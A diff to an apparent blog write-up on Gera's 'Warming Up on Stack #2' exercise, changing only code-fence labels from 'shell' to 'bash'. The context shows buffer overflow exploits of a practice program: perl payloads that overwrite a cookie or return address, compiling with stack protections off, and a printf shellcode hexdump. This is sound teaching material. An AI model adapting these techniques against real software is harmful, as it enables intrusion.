@@ -84,7 +84,7 @@ printed:
 
 Here's a brief description of the test system:
 
-```shell
+```bash
 # cat /etc/lsb-release | grep DESC ; uname -a | cut -d' ' -f1,3,12-13 ; gcc --version | grep gcc ; cat /proc/cpuinfo | grep -E '(vendor|model|flags)'
 DISTRIB_DESCRIPTION=*Ubuntu 10.04.2 LTS*
 Linux 2.6.38 i686 GNU/Linux
@@ -102,7 +102,7 @@ Here's the GCC commandline to prepare
 [stack2.c](http://community.corest.com/%7Egera/InsecureProgramming/stack2.html)
 for this solution:
 
-```shell
+```bash
 # gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack2 stack2.c
 stack2.c: In function ‘main’:
 stack2.c:8: warning: incompatible implicit declaration of built-in function ‘printf’
@@ -115,7 +115,7 @@ stack2.c:(.text+0x27): warning: the `gets' function is dangerous and should not 
 All done, let's exploit
 [stack2.c](http://community.corest.com/%7Egera/InsecureProgramming/stack2.html):
 
-```shell
+```bash
 # perl -e 'print "A"x80 . "\x05\x03\x02\x01"' | ./stack2
 buf: bffff4c4 cookie: bffff514
 you win!
@@ -156,7 +156,7 @@ and find out the location of the `printf` function which displays the
 
 The address turns out to be 0x8048479. Let's try exploiting:
 
-```shell
+```bash
 # perl -e 'print "A"x88 . "\x79\x84\x04\x08"' | ./stack2
 buf: bffff4c4 cookie: bffff514
 you win!
@@ -172,7 +172,7 @@ and request GCC to mark program stack as executable. Additionally, we
 also need to turn ASLR off so that we can have a static return address
 to overwrite EIP with:
 
-```shell
+```bash
 # gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack2 stack2.c 2>/dev/null ; readelf -l stack2 | grep GNU_STACK
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
 #
@@ -187,7 +187,7 @@ in the [Gera's Warming Up on Stack #1 -
 Solutions](/2012/8/27/geras-wuos-stack1-solutions/) post could be reused
 here:
 
-```shell
+```bash
 # ./stack2
 buf: bffff4c4 cookie: bffff514
 #
@@ -204,7 +204,7 @@ Solution #4: Inject a NOP-prefixed printf(you win!) shellcode through an environ
 
 Lets get straight to exploitation:
 
-```shell
+```bash
 # echo $WINCODE | hexdump -C
 00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|
 00000010  80 31 c0 40 31 db cd 80  e8 e5 ff ff ff 79 6f 75  |.1.@1........you|
